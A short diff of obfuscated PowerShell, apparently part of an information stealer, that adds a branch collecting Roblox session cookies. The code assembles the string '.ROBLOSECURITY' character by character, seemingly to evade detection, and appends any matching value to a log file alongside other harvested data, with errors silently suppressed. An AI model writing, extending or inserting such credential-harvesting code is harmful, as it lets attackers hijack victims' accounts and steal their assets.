@@ -101,6 +101,8 @@ foreach($p2 in $rp0){
                             if($cae -ge 0){$ck=$c1.Substring($cae);Add-Content $f0 "$tR|$ck"
                             }else{Add-Content $f0 "$tR|$($c1.Substring(0,[Math]::Min(2000,$c1.Length)))"}
                         }
+        }elseif($r2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')){
+            Add-Content $f0 "$tR|$r2"
         }
     }catch{}
     break
